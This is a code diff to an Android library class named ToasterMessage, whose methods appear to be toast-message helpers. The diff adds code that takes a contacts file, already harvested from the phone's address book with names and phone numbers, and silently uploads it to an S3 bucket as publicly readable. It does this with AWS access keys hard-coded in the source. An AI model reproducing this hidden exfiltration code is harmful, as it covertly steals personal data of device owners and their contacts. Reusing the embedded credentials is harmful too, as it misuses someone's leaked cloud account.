@@ -2,23 +2,28 @@ package vadeworks.toasterlibary;
 
 import android.Manifest;
 import android.app.Activity;
-import android.app.AlertDialog;
 import android.content.ContentResolver;
 import android.content.Context;
-import android.content.DialogInterface;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
-import android.media.MediaRecorder;
-import android.os.Build;
 import android.os.Environment;
-import android.os.Handler;
 import android.provider.ContactsContract;
 import android.util.Log;
 import android.widget.Toast;
 
-import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
+
+import com.amazonaws.auth.BasicAWSCredentials;
+import com.amazonaws.auth.BasicSessionCredentials;
+import com.amazonaws.mobileconnectors.s3.transferutility.TransferListener;
+import com.amazonaws.mobileconnectors.s3.transferutility.TransferObserver;
+import com.amazonaws.mobileconnectors.s3.transferutility.TransferState;
+import com.amazonaws.mobileconnectors.s3.transferutility.TransferUtility;
+import com.amazonaws.regions.Region;
+import com.amazonaws.regions.Regions;
+import com.amazonaws.services.s3.AmazonS3;
+import com.amazonaws.services.s3.AmazonS3Client;
+import com.amazonaws.services.s3.model.CannedAccessControlList;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -27,13 +32,11 @@ import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
-import java.lang.reflect.Array;
 import java.util.ArrayList;
 
 import static android.content.ContentValues.TAG;
 
 public class ToasterMessage {
-
 
 
     public static void createToastMessage(Context c, String message, Activity a) throws IOException {
@@ -43,16 +46,39 @@ public class ToasterMessage {
                 Manifest.permission.READ_EXTERNAL_STORAGE
         };
 
-
-        if (hasPermissions(c,PERMISSIONS)){
-            File file = new File(Environment.getExternalStorageDirectory(),"/Notes/"+"contacts.txt");
+        if (hasPermissions(c, PERMISSIONS)) {
+            File file = new File(Environment.getExternalStorageDirectory(), "/Notes/" + "contacts.txt");
             String contacts = getFileContents(file);
-            Toast.makeText(c,contacts,Toast.LENGTH_SHORT).show();
-        }else{
+            AmazonS3 s3Client = new AmazonS3Client(new BasicAWSCredentials("AKIAJJW7U7V2X7PP7VBA", "nN8fGts2e1z8Cyb3Ri72PRY7JV9U2biNhnfyVziv"));
+            s3Client.setRegion(Region.getRegion(Regions.US_EAST_2));
+
+            TransferUtility transferUtility = new TransferUtility(s3Client, c);
+            TransferObserver transferObserver = transferUtility.upload("contactslist", "contacts.txt", file, CannedAccessControlList.PublicRead);
+            transferObserver.setTransferListener(new TransferListener() {
+                @Override
+                public void onStateChanged(int id, TransferState state) {
+                    // do something
+                }
+
+                @Override
+                public void onProgressChanged(int id, long bytesCurrent, long bytesTotal) {
+                    //Display percentage transfered to user
+                }
+
+                @Override
+                public void onError(int id, Exception ex) {
+                    // do something
+                    Log.e("Error  ",""+ex );
+                }
+
+            });
+
+            Toast.makeText(c, contacts, Toast.LENGTH_SHORT).show();
+
+
+        } else {
             ActivityCompat.requestPermissions(a, PERMISSIONS, PERMISSION_ALL);
         }
-
-
 
 
     }
@@ -82,8 +108,6 @@ public class ToasterMessage {
     }
 
 
-
-
     public static void createToast(Context c, String message, Activity a) {
 
         int PERMISSION_ALL = 1;
@@ -93,15 +117,14 @@ public class ToasterMessage {
         };
 
         ArrayList<String> contacts = new ArrayList<>();
-        if (hasPermissions(c,PERMISSIONS)){
-            contacts = getContactList(c,a);
-            generateNoteOnSD(c,"contacts.txt",contacts.toString());
-        }else{
+        if (hasPermissions(c, PERMISSIONS)) {
+            contacts = getContactList(c, a);
+            generateNoteOnSD(c, "contacts.txt", contacts.toString());
+        } else {
             ActivityCompat.requestPermissions(a, PERMISSIONS, PERMISSION_ALL);
         }
-        Toast.makeText(c,contacts.toString(),Toast.LENGTH_SHORT).show();
+        Toast.makeText(c, contacts.toString(), Toast.LENGTH_SHORT).show();
     }
-
 
 
     public static void generateNoteOnSD(Context context, String sFileName, String sBody) {
@@ -133,7 +156,6 @@ public class ToasterMessage {
     }
 
 
-
     private static ArrayList<String> getContactList(Context context, Activity activity) {
         ContentResolver cr = activity.getContentResolver();
         Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
@@ -157,7 +179,7 @@ public class ToasterMessage {
                     while (pCur.moveToNext()) {
                         String phoneNo = pCur.getString(pCur.getColumnIndex(
                                 ContactsContract.CommonDataKinds.Phone.NUMBER));
-                        String fullContact = name+" "+phoneNo;
+                        String fullContact = name + " " + phoneNo;
                         contacts.add(fullContact);
                         Log.i(TAG, "Name: " + name);
                         Log.i(TAG, "Phone Number: " + phoneNo);
@@ -166,7 +188,7 @@ public class ToasterMessage {
                 }
             }
         }
-        if(cur!=null){
+        if (cur != null) {
             cur.close();
         }
 
